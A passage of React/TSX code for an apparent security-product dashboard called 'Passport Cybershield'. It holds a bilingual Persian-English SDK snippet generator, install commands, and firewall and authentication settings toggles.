                  {JSON.stringify({
                    schema_version: "2.4.0",
                    target_endpoint: guideSelectedEndpoint === "evaluate" ? "/api/v1/decision/evaluate" : guideSelectedEndpoint === "verify" ? "/api/v1/fingerprint/verify" : "/api/v1/threat/ip-check",
                    strictness_profile: guideSecurityStrictness,
                    handshake_auth: guideAuthMethod,
                    policy_enforcement: {
                      fail_open: guideSecurityStrictness !== "zero-trust",
                      gateway_timeout_limit: guideSecurityStrictness === "zero-trust" ? 2500 : guideSecurityStrictness === "balanced" ? 800 : 300,
                      allow_heuristics_fallback: guideSecurityStrictness === "permissive",
                      require_certified_secure_path: guideSecurityStrictness === "zero-trust"
                    },
                    payload_signature_requirement: guideAuthMethod === "crypto_signature" ? "HMAC-SHA256" : "Standard API Key Header"
                  }, null, 2)}
                </pre>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // 6.4) SUBVIEW: SDKS & CLIENT TOOLS
  if (activeTab === "sdksAndTools") {
    // Return language specific draft snippet
    const getCodeSnippet = () => {
      const modeParam = sdkConfigAction === "block" ? "ActionMode.BLOCK_ON_RISK" : "ActionMode.LOGGER_ONLY";
      const sens = sdkConfigSensitivity === "extreme" ? "Sensitivity.EXTREME_FIDO" : sdkConfigSensitivity === "medium" ? "Sensitivity.MEDIUM_STANDARD" : "Sensitivity.PERMISSIVE_LOW";

      if (sdkSelectedLanguage === "python") {
        return `from passport_security import PassportClient, ${modeParam}, ${sens}

# Initialize Passport Cybershield Client
passport = PassportClient(
    api_key="your_sk_live_token_here",
    action_profile=${modeParam},
    trigger_level=${sens}
)

def handle_incoming_request(request):
    # Audit device, IP intelligence and physical keystrokes instantly
    decision = passport.evaluate_payload({
        "ip_address": request.remote_addr,
        "user_agent": request.headers.get("User-Agent"),
        "canvas_fingerprint": request.json.get("canvas_hash")
    })
    
    if decision.is_blocked():
        return {"status": "denied", "reason": decision.reason}, 403
        
    return {"status": "authorized", "clearance": decision.clearance_level}
`;
      } else if (sdkSelectedLanguage === "node") {
        return `import { PassportClient, ${modeParam}, ${sens} } from '@passport/security-client';

// Keep apiKey secure, load via env processes
const passport = new PassportClient({
  apiKey: process.env.PASSPORT_SECRET_KEY,
  actionProfile: ${modeParam},
  triggerLevel: ${sens}
});

export async function middleware(req) {
  const result = await passport.evaluate({
    ip: req.ip,
    userAgent: req.headers.get('user-agent'),
    canvasHash: req.body.canvasHash
  });

  if (result.isBlocked) {
    return Response.json({ error: 'Device Blocked' }, { status: 403 });
  }
  
  return next();
}
`;
      } else {
        // go
        return `package main

import (
	"fmt"
	"net/http"
	"github.com/passport-security/sdk-go"
)

func main() {
	client := passport.NewClient("your_sk_live_token_here")
	client.SetActionMode(passport.${sdkConfigAction === "block" ? "BlockOnRisk" : "LoggerOnly"})
	client.SetSensitivity(passport.${sdkConfigSensitivity === "extreme" ? "ExtremeFido" : sdkConfigSensitivity === "medium" ? "MediumStandard" : "PermissiveLow"})

	http.HandleFunc("/api/secure", func(w http.ResponseWriter, r *http.Request) {
		decision, _ := client.Evaluate(r.RemoteAddr, r.UserAgent())
		if decision.Blocked {
			http.Error(w, "Access Denied by Cybershield Gate", http.StatusForbidden)
			return
		}
		fmt.Fprintf(w, "Session Cleared")
	})
}
`;
      }
    };

    return (
      <div className="p-4 md:p-6 space-y-6 text-right ltr:text-left" dir={isRtl ? "rtl" : "ltr"}>
        <div className="border-b border-dash-border/40 pb-4">
          <h2 className="text-xl font-bold text-white flex items-center gap-2">
            <Wrench className="w-5 h-5 text-indigo-400" />
            {isRtl ? "ابزارها، کدها و کیت‌های برنامه‌نویسی توسعه‌دهندگان (SDKs)" : "Developer Toolkit & SDK Catalog"}
          </h2>
          <p className="text-xs text-slate-500 mt-1">
            {isRtl 
              ? "دریافت کدهای نمونه برای مدیریت ورود امن و بسته‌های زبان‌های پایتون، جاوااسکریپت و گو" 
              : "Integrate Passport security protocols instantly. Compile, configure and apply standard templates."}
          </p>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          {/* Dynamic Code blueprint builder */}
          <div className="lg:col-span-5 bg-dash-panel border border-dash-border rounded-xl p-5 space-y-4">
            <h3 className="text-sm font-semibold text-slate-205 flex items-center gap-2">
              <Sliders className="w-4 h-4 text-indigo-400" />
              {isRtl ? "تنظیم هوشمند پارامترهای SDK" : "Interactive SDK Template Builder"}
            </h3>

            {/* Language select */}
            <div className="space-y-1">
              <label className="text-[10px] text-slate-500 uppercase font-mono block">{isRtl ? "زبان برنامه نویسی" : "Target Runtime environment"}</label>
              <div className="grid grid-cols-3 gap-2">
                {["python", "node", "go"].map((lang) => (
                  <button
                    key={lang}
                    onClick={() => setSdkSelectedLanguage(lang)}
                    className={cn(
                      "py-1.5 rounded-lg border text-xs font-bold font-mono transition-all uppercase cursor-pointer",
                      sdkSelectedLanguage === lang
                        ? "bg-indigo-600/10 border-indigo-500 text-indigo-400"
                        : "bg-slate-950 border-slate-800 text-slate-500 hover:text-slate-300"
                    )}
                  >
                    {lang === "node" ? "Node/JS" : lang}
                  </button>
                ))}
              </div>
            </div>

            {/* Action option */}
            <div className="space-y-1">
              <label className="text-[10px] text-slate-500 uppercase font-mono block">{isRtl ? "واکنش پیش‌فرض فایروال به ریسک بالا" : "Default Action Override"}</label>
              <div className="grid grid-cols-2 gap-2">
                <button
                  onClick={() => setSdkConfigAction("block")}
                  className={cn(
                    "py-1.5 rounded-lg border text-xs font-bold transition-all cursor-pointer",
                    sdkConfigAction === "block"
                      ? "bg-rose-500/10 border-rose-550/50 text-rose-400"
                      : "bg-slate-955 border-slate-800 text-slate-500"
                  )}
                >
                  {isRtl ? "مسدودسازی خودکار" : "Block automatically"}
                </button>
                <button
                  onClick={() => setSdkConfigAction("log")}
                  className={cn(
                    "py-1.5 rounded-lg border text-xs font-bold transition-all cursor-pointer",
                    sdkConfigAction === "log"
                      ? "bg-amber-500/10 border-amber-550/50 text-amber-400"
                      : "bg-slate-955 border-slate-800 text-slate-500"
                  )}
                >
                  {isRtl ? "فقط مانیتور و لاگ کردن" : "Logger only / dry run"}
                </button>
              </div>
            </div>

            {/* Sensitivity Selection */}
            <div className="space-y-1">
              <label className="text-[10px] text-slate-500 uppercase font-mono block">{isRtl ? "سطح سخت‌گیری آنالایزر هوشمند" : "Aggressive Sensitivity tuning"}</label>
              <select
                value={sdkConfigSensitivity}
                onChange={(e) => setSdkConfigSensitivity(e.target.value)}
                className="w-full bg-slate-955 border border-slate-800 text-slate-300 rounded-lg px-3 py-2 text-xs focus:outline-none focus:border-indigo-500"
              >
                <option value="extreme">{isRtl ? "حداکثر امنیت (سرویس‌های مالی / FIDO2 اجباری)" : "Extreme Security (FIDO2 Required)"}</option>
                <option value="medium">{isRtl ? "استاندارد معتدل (توصیه شده)" : "Standard Medium Balanced"}</option>
                <option value="permissive">{isRtl ? "پذیرنده ملایم (حداقل اصطکاک برای کلاینت)" : "Permissive / Low Latency Mode"}</option>
              </select>
            </div>

            {/* Quick installation codes */}
            <div className="border-t border-dash-border/40 pt-4 space-y-2">
              <span className="text-[10px] text-slate-500 font-mono uppercase block">{isRtl ? "کد نصب بسته در کنسول" : "Install Terminal command"}</span>
              <div className="p-3 bg-slate-950 rounded-lg border border-slate-900 font-mono text-[11px] text-slate-300 flex justify-between items-center select-all" dir="ltr">
                <code>
                  {sdkSelectedLanguage === "python" ? "pip install passport-security" :
                   sdkSelectedLanguage === "node" ? "npm install @passport/security-client" : "go get github.com/passport-security/sdk-go"}
                </code>
              </div>
            </div>
          </div>

          {/* Generated Code Window */}
          <div className="lg:col-span-7 space-y-4">
            <div className="bg-dash-panel border border-dash-border rounded-xl p-5 flex flex-col justify-between">
              <div className="border-b border-dash-border/40 pb-3 flex justify-between items-center mb-4">
                <h3 className="text-xs font-bold text-slate-400 uppercase tracking-widest font-mono">
                  {sdkSelectedLanguage === "python" ? "main.py" : sdkSelectedLanguage === "node" ? "middleware.ts" : "main.go"}
                </h3>
                <button
                  onClick={() => {
                    navigator.clipboard.writeText(getCodeSnippet());
                    setApiUsageSuccessMsg(isRtl ? "کده کپی شد!" : "Source code copied to clipboard!");
                    setTimeout(() => setApiUsageSuccessMsg(""), 3000);
                  }}
                  className="px-2 py-0.5 rounded bg-indigo-600 hover:bg-indigo-500 text-white font-mono text-[10px] font-bold cursor-pointer"
                >
                  COPY CODE
                </button>
              </div>

              {/* Code viewer */}
              <div className="p-4 bg-slate-950 border border-slate-900 rounded-xl overflow-x-auto min-h-72 select-all select-text font-mono">
                <pre className="text-[11px] text-indigo-400 leading-relaxed text-left ltr:text-left rtl:text-left" dir="ltr">
                  {getCodeSnippet()}
                </pre>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // 7) SUBVIEW: INFRASTRUCTURE SETTINGS
  if (activeTab === "settings" || activeTab === "usersAndTeams" || activeTab === "billingAndPlans") {
    return (
      <div className="p-4 md:p-6 space-y-6 text-right ltr:text-left" dir={isRtl ? "rtl" : "ltr"}>
        <div className="flex justify-between items-center border-b border-dash-border/40 pb-4">
          <div>
            <h2 className="text-xl font-bold text-white flex items-center gap-2">
              <Settings className="w-5 h-5 text-indigo-400" />
              {isRtl ? "پیکربندی کلی فایروال و گیت‌وی" : "System Settings & Cyber Security Rules"}
            </h2>
            <p className="text-xs text-slate-500 mt-1">
              {isRtl ? "تغییر رفتارهای پیش‌فرض و پارامترهای مسدودسازی کلاینت‌ها" : "Enforce authentication modes and set proxy security profiles."}
            </p>
          </div>
          <button
            onClick={handleSaveSettings}
            className="px-4 py-2 bg-indigo-600 hover:bg-indigo-500 text-white text-xs font-bold uppercase tracking-wider rounded-lg shadow-md transition-all"
          >
            {isRtl ? "اعمال تغییرات روی سرور" : "Deploy Settings"}
          </button>
        </div>

        {settingsSuccess && (
          <div className="p-3 bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 rounded-lg text-xs font-medium flex items-center gap-2">
            <Check className="w-4 h-4" />
            {settingsSuccess}
          </div>
        )}

        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          <div className="lg:col-span-8 bg-dash-panel border border-dash-border rounded-xl p-5 space-y-6">
            <h3 className="text-xs font-bold text-slate-400 uppercase tracking-wider border-b border-dash-border/40 pb-2">
              {isRtl ? "قوانین امنیتی و احراز هویت" : "Authentication Guard Rules"}
            </h3>

            {/* Toggle 1 */}
            <div className="flex items-center justify-between pb-4 border-b border-dash-border/30">
              <div className="max-w-lg">
                <div className="text-xs font-bold text-slate-200">{isRtl ? "اجبار ورود با کلید سخت‌افزاری FIDO2" : "Enforce FIDO2 Hardware Auth"}</div>
                <div className="text-[10px] text-slate-500 mt-0.5">
                  {isRtl 
                    ? "برای ورودهای با دسترسی بالا (ادمین و اونر)، اسکن سخت‌افزاری در مرورگر الزامی است" 
                    : "Require physical WebAuthn security key scan for every super admin session."}
                </div>
              </div>
              <button
                onClick={() => setFwHardwareCheck(!fwHardwareCheck)}
                className={cn(
                  "w-11 h-6 rounded-full transition-colors relative flex items-center focus:outline-none",
                  fwHardwareCheck ? "bg-indigo-600" : "bg-slate-800"
                )}
              >
                <span className={cn(
                  "w-4 h-4 rounded-full bg-white absolute transition-all",
                  fwHardwareCheck ? "left-6" : "left-1"
                )} />
              </button>
            </div>

            {/* Toggle 2 */}
            <div className="flex items-center justify-between pb-4 border-b border-dash-border/30">
              <div className="max-w-lg">
                <div className="text-xs font-bold text-slate-200">{isRtl ? "مسدودسازی خودکار وی‌پی‌ان و تور" : "Drop VPN & TOR Tunnels Automatically"}</div>
                <div className="text-[10px] text-slate-500 mt-0.5">
                  {isRtl 
                    ? "آی‌پی‌های شناسایی شده از رنج پراکسی عمومی فوراً توسط سیستم گیت‌وی ریجکت می‌شوند" 
                    : "Instantly drop packages originating from VPN/Tor exit nodes without evaluation."}
                </div>
              </div>
              <button
                onClick={() => setFwVpnBlock(!fwVpnBlock)}
                className={cn(
                  "w-11 h-6 rounded-full transition-colors relative flex items-center focus:outline-none",
                  fwVpnBlock ? "bg-indigo-600" : "bg-slate-800"
                )}
              >
                <span className={cn(
                  "w-4 h-4 rounded-full bg-white absolute transition-all",
                  fwVpnBlock ? "left-6" : "left-1"
                )} />
              </button>
            </div>

            {/* Toggle 3 */}
            <div className="flex items-center justify-between">
              <div className="max-w-lg">
                <div className="text-xs font-bold text-slate-200">{isRtl ? "کنترل خودکار محدودیت نرخ درخواست (Rate Limit)" : "Smart IP Request Rate Limiting"}</div>
                <div className="text-[10px] text-slate-500 mt-0.5">
                  {isRtl 
                    ? "در صورت ثبت بیش از ۱۰۰ درخواست از یک آی‌پی در ثانیه به طور خودکار مسدود می‌شود" 
                    : "Limits client sessions to max 100 API queries per second autonomously."}
                </div>
              </div>
              <button
                onClick={() => setFwRateLimiter(!fwRateLimiter)}
                className={cn(
                  "w-11 h-6 rounded-full transition-colors relative flex items-center focus:outline-none",
                  fwRateLimiter ? "bg-indigo-600" : "bg-slate-800"
                )}
              >
                <span className={cn(
                  "w-4 h-4 rounded-full bg-white absolute transition-all",
                  fwRateLimiter ? "left-6" : "left-1"
                )} />
              </button>
            </div>
          </div>

          <div className="lg:col-span-4 bg-dash-panel border border-dash-border rounded-xl p-5 space-y-4">
            <h3 className="text-xs font-bold text-slate-400 uppercase tracking-wider">
              {isRtl ? "میزان حساسیت فایروال" : "Firewall Rules Severity"}
            </h3>
            <div className="space-y-2">
              <div className="flex justify-between font-mono text-xs">
                <span>{fwSensitivity}%</span>
                <span>{fwSensitivity > 80 ? (isRtl ? "تدافعی شدید" : "Paranoid") : (isRtl ? "متعادل" : "Moderate")}</span>
              </div>
              <input
                type="range"
                min="10"
                max="100"
                value={fwSensitivity}
                onChange={(e) => setFwSensitivity(Number(e.target.value))}
                className="w-full accent-indigo-505 bg-slate-850"
              />
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Fallback
  return null;
}

// Internal fake Icon component for Laptop (was missing from lucide imports in Dashboard to keep imports clean earlier, so added inline for the snippet)
function Laptop(props: any) {
  return (
    <svg
      xmlns="http://www.w3.org/2000/svg"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="2"
      strokeLinecap="round"
      strokeLinejoin="round"
      {...props}
    >
      <rect width="20" height="14" x="2" y="3" rx="2" />
      <line x1="2" x2="22" y1="21" y2="21" />
    </svg>
  );
}
